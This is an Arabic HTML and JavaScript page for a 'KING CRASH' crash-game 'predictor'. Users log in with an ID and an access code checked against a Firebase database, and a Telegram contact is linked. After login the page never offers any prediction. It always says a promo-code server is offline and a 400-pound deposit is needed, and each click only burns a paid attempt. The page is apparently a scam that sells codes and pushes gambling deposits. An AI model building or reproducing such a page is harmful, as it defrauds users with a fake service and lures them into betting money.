<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>KING CRASH</title>
<style>
  body {
    margin: 0;
    font-family: 'Cairo', sans-serif;
    background: radial-gradient(circle at center, #2b0000 0%, #0d0000 100%);
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    overflow: hidden;
  }

  /* ===== واجهة تسجيل الدخول ===== */
  #loginBox {
    background: linear-gradient(135deg, #330000, #660000);
    padding: 30px;
    border-radius: 20px;
    box-shadow: 0 0 25px rgba(255,0,0,0.6), inset 0 0 20px rgba(255,50,50,0.4);
    width: min(90vw, 420px);
    text-align: center;
    animation: glowRed 4s infinite alternate;
    position: relative;
  }

  @keyframes glowRed {
    0% { box-shadow: 0 0 20px rgba(255,0,0,0.4), inset 0 0 20px rgba(255,50,50,0.4); }
    100% { box-shadow: 0 0 35px rgba(255,0,0,0.9), inset 0 0 30px rgba(255,50,50,0.7); }
  }

  #loginBox h1 {
    color: #ff3333;
    font-size: 28px;
    margin-bottom: 15px;
    text-shadow: 0 0 15px #ff0000;
  }

  .input {
    width: 100%;
    height: 45px;
    border: none;
    border-radius: 10px;
    margin: 8px 0;
    padding: 0 10px;
    text-align: center;
    font-size: 16px;
    background: rgba(40,0,0,0.9);
    color: #fff;
    box-shadow: inset 0 0 10px rgba(255,0,0,0.4);
  }

  .error {
    display: none;
    color: #ff5555;
    font-weight: 700;
    margin: 6px 0;
  }

  button {
    padding: 12px 24px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(45deg, #ff0000, #cc0000);
    color: #fff;
    font-size: 16px;
    cursor: pointer;
    font-weight: bold;
    text-shadow: 0 0 8px #ff3333;
    box-shadow: 0 0 15px rgba(255,0,0,0.6);
    transition: 0.3s;
  }

  button:hover {
    box-shadow: 0 0 25px rgba(255,0,0,0.9);
    transform: scale(1.05);
  }

  .telegram-btn {
    position: absolute;
    bottom: -70px;
    left: 50%;
    transform: translateX(-50%);
    background: #ff0000;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 0 15px rgba(255,0,0,0.8);
    cursor: pointer;
    transition: 0.3s;
  }

  .telegram-btn:hover { background: #ff3333; }
  .telegram-btn img { width: 30px; height: 30px; }

  /* ===== واجهة اللعبة ===== */
  #gameBox {
    text-align: center;
    background: radial-gradient(circle at center, #ff0000 0%, #1a0000 100%);
    padding: 30px;
    border-radius: 20px;
    box-shadow: 0 0 25px rgba(255,0,0,0.7);
    width: min(95vw, 500px);
    display: none;
    position: relative;
    overflow: hidden;
  }

  #gameBox h1 {
    color: #fff;
    font-size: 28px;
    margin-bottom: 20px;
    text-shadow: 0 0 10px #ff3333;
  }

  /* ===== الدائرة (الإطار الأخضر × الأصفر) ===== */
  .circle {
    width: 280px;
    height: 280px;
    border-radius: 50%;
    position: relative;
    margin: 25px auto;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-weight: bold;
    font-size: 18px;
    text-align: center;
    text-shadow: 0 0 10px #ff3366;
  }

  .circle::before {
    content: "";
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 6px solid transparent;
    border-top: 6px solid #00ff00;
    border-right: 6px solid #ffff00;
    border-bottom: 6px solid #00ff00;
    border-left: 6px solid #ffff00;
    animation: rotate 3s linear infinite;
    box-shadow: 0 0 20px #00ff00, 0 0 25px #ffff00;
  }

  @keyframes rotate {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }

  #circleText {
    font-size: 16px;
    padding: 10px;
    z-index: 2;
  }

  .attempts {
    margin-top: 20px;
    color: #fff;
    font-weight: bold;
  }

  .attempts b {
    color: #00ff00;
  }
</style>
</head>
<body>

<!-- تسجيل الدخول -->
<div id="loginBox">
  <h1>تسجيل الدخول</h1>
  <input id="userId" class="input" type="text" placeholder="ID" />
  <input id="code" class="input" type="text" placeholder="Code" autocomplete="one-time-code" />
  <div id="errorMsg" class="error">كود خطأ أو انتهى</div>
  <button onclick="login()">تأكيد</button>

  <a href="https://t.me/Loty122" target="_blank" class="telegram-btn">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"/>
  </a>
</div>

<!-- واجهة اللعبة -->
<div id="gameBox">
  <h1>KING CRASH</h1>
  <div class="circle">
    <div id="circleText">
      Pemo1x غير متصل بسيرفر البروموكود<br>
      تأكد من عمل الإيداع <b>400 جنيه</b><br>حتى يتم إظهار التوقعات لك
    </div>
  </div>
  <div class="attempts">المحاولات: <b id="attempts">0</b></div>
  <button onclick="nextStep()">Next</button>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
  import { getDatabase, ref, get, update } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyD08Eud45qyQH8vV6lRQYyDhpvBY5ZXRbE",
    authDomain: "king-admin-1a7ca.firebaseapp.com",
    databaseURL: "https://king-admin-1a7ca-default-rtdb.firebaseio.com",
    projectId: "king-admin-1a7ca",
    storageBucket: "king-admin-1a7ca.firebasestorage.app",
    messagingSenderId: "942166600491",
    appId: "1:942166600491:web:1962bba7655ddd0926b36e"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  let attempts = 0;
  let currentCode = "";

  window.login = async () => {
    const userId = document.getElementById("userId").value.trim();
    const codeInput = document.getElementById("code").value.trim();
    const errorMsg = document.getElementById("errorMsg");

    if (!userId || !codeInput) {
      errorMsg.style.display = "block";
      errorMsg.textContent = "ادخل الـ ID والكود";
      return;
    }

    try {
      const snap = await get(ref(db, "codes/" + codeInput));
      if (!snap.exists()) throw new Error("invalid");

      const data = snap.val();
      if ((data.remaining ?? 0) <= 0) throw new Error("exhausted");

      currentCode = codeInput;
      attempts = data.remaining;
      await update(ref(db, "codes/" + codeInput), { user: userId });

      errorMsg.style.display = "none";
      document.getElementById("loginBox").style.display = "none";
      document.getElementById("gameBox").style.display = "block";
      updateAttemptsUI();
    } catch(e){
      errorMsg.style.display = "block";
      errorMsg.textContent = "كود خطأ أو انتهى";
    }
  };

  function updateAttemptsUI(){
    document.getElementById("attempts").textContent = attempts;
  }

  function logoutAuto(){
    document.getElementById("gameBox").style.display = "none";
    document.getElementById("loginBox").style.display = "block";
    document.getElementById("userId").value = "";
    document.getElementById("code").value = "";
    currentCode = "";
  }

  async function deductAttempt(){
    if (attempts <= 0) {
      logoutAuto();
      return;
    }
    attempts--;
    updateAttemptsUI();
    await update(ref(db, "codes/" + currentCode), { remaining: attempts });

    if (attempts <= 0) {
      setTimeout(()=> logoutAuto(), 1000);
    }
  }

  window.nextStep = () => {
    document.getElementById("circleText").innerHTML = `
      Pemo1x غير متصل بسيرفر البروموكود<br>
      تأكد من عمل الإيداع <b>400 جنيه</b><br>حتى يتم إظهار التوقعات لك
    `;
    deductAttempt();
  };
</script>
</body>
</html>
